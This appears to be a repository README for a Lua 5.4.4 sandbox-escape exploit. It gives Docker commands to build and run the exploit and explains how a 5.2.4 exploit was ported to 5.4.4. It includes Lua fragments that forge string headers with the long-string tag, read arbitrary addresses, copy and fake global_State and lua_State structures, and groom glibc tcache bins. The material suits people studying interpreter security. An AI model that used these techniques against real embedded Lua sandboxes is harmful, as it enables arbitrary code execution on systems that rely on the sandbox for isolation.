# lua-5.4.4-sandbox-escape

### Create docker image

```sh
docker build --tag lua-5.4.4-escape/x64:latest x64
```
### How to run

```sh
docker run -it lua-5.4.4-escape/x64:latest /bin/bash
```

### Exploit

```sh
/LUA/lua/lua /LUA/exploit.lua
```



### What has changed from version 5.2.4 sandbox escaping exploit code?

- TString

    `v5.2.4 Lua TString`
    ```c++
    /*
    ** Header for string value; string bytes follow the end of this structure
    */
    typedef union TString {
      L_Umaxalign dummy;  /* ensures maximum alignment for strings */
      struct {
        CommonHeader;
        lu_byte extra;  /* reserved words for short strings; "has hash" for longs */
        unsigned int hash;
        size_t len;  /* number of characters in string */
      } tsv;
    } TString;
    ```


    `v5.4.4 Lua TString`
    ```c++
    /*
    ** Header for a string value.
    */
    typedef struct TString {
      CommonHeader;
      lu_byte extra;  /* reserved words for short strings; "has hash" for longs */
      lu_byte shrlen;  /* length for short strings */
      unsigned int hash;
      union {
        size_t lnglen;  /* length for long strings */
        struct TString *hnext;  /* linked list for hash table */
      } u;
      char contents[1];
    } TString;
    ```

    Moving from 5.2.4 to 5.4.4, you can see that the variable handling the length of TString is managed by dividing it into shrlen and lnglen.

- OP_LEN code

    `v5.2.4 Lua OP_LEN code`
    ```c++

    void luaV_execute (lua_State *L) {
    /*skipped*/
    vmcase(OP_LEN,
            Protect(luaV_objlen(L, ra, RB(i)));
          )
    /*skipped*/
    }


    void luaV_objlen (lua_State *L, StkId ra, const TValue *rb) {
      const TValue *tm;
      switch (ttypenv(rb)) {
    /*skipped*/
        case LUA_TSTRING: {
          setnvalue(ra, cast_num(tsvalue(rb)->len));
          return;
        }
    /*skipped*/
    
      }
      callTM(L, tm, rb, rb, ra, 1);
    }
    
    #define LUA_TSTRING     4
    
    
    ```


    `v5.4.4 Lua OP_LEN code`
    ```c++
    void luaV_execute (lua_State *L, CallInfo *ci) {
    /*skipped*/
        vmcase(OP_LEN) {
                Protect(luaV_objlen(L, ra, vRB(i)));
                vmbreak;
              }
    /*skipped*/
    }
    
    /*
    ** Main operation 'ra = #rb'.
    */
    void luaV_objlen (lua_State *L, StkId ra, const TValue *rb) {
      const TValue *tm;
      switch (ttypetag(rb)) {
    /*skipped*/
        case LUA_VSHRSTR: {
          setivalue(s2v(ra), tsvalue(rb)->shrlen);
          return;
        }
        case LUA_VLNGSTR: {
          setivalue(s2v(ra), tsvalue(rb)->u.lnglen);
          return;
        }
    /*skipped*/
    
      }
      luaT_callTMres(L, tm, rb, rb, ra);
    }
    
    /* Variant tags for strings */
    #define LUA_TSTRING     4
    #define LUA_VSHRSTR makevariant(LUA_TSTRING, 0)  /* short strings */
    #define LUA_VLNGSTR makevariant(LUA_TSTRING, 1)  /* long strings */
    ```
    
    As the length of TString is treated as shrlen and lnglen, the behavior of OP_LEN for strings has also changed, so tag must be set to LUA_VLNGSTR.
    
    
    ```lua
    local function readAddr(addr)
        collectgarbage()
    -- skipped
        local _addr = numTo64L(addr - 16)
        local padding_a = string.rep('\65', 8) -- 0x41 padding
        local padding_b = string.rep('\20', 15) -- LUA_VLNGSTR tag padding
    -- skipped
    
    ```



- OP_LOADI code

    Looking at the foo function that exists in the existing code, an integer value is put into the a variable. In version 5.2.4, the LOADK command is used to do this. However, since version 5.4.4 uses the LOADI command to handle integer assignment, it was possible to induce the use of the LOADK command by changing the integer assignment to a string assignment.
    
    `v5.2.4 Sandbox Escaping exploit code`
    
    ```lua
    local function foo()
        local a=1 a=2 a=3
        return (#a)
    end
    ```
    
    
    `v5.4.4 Sandbox Escaping exploit code`
    
    ```lua
    local function foo()
        local a="a" a="b" a="c" 
        return (#a)
    end
    ```

- global_State, lua_State structure size change

    When running the existing exploit, to create fake global_State and fake lua_State, a string is created as much as the size of the structure. At this time, the size of the structure changes and this is reflected.
    
    ```lua
        local l_G_addr = readAddr(readAddr(t_addr) + 0x18)
    
        l_G = memcpy(l_G_addr, 1416) -- sizeof(global_State)=1416
        l_G = numTo64L(addr) .. numTo64L(arg) .. l_G:sub(17)
        l_G_addr = bufferAddress(l_G)
    
    
        local t_buffer = memcpy(t_addr, 200) -- sizeof(lua_State)=200
    ```


- tcache bins clean (Ubuntu glibc ptmalloc)

    In the luaM_newvectorchekced function, the malloc function is called and the chunk of variable k is allocated. At this time, if the tcache bin is full, the desired chunk is not allocated and the exploit fails. Because of this, we allocate a variable and empty the chunk that exists in the tcache bin.
    
    ```lua
        -- clean tcache bins
    
        local t1 = {}
        local t2 = {}
        local t3 = {}
        local t4 = {}
        local t5 = {}
        local t6 = {}
        local t7 = {}
    
    
        local intermid = {}
    
        collectgarbage()
        intermid = nil
        k=nil
        collectgarbage()
    
        g, err = load(g)
        g() 
    ```





### Reference

[https://github.com/erezto/lua-sandbox-escape](https://github.com/erezto/lua-sandbox-escape)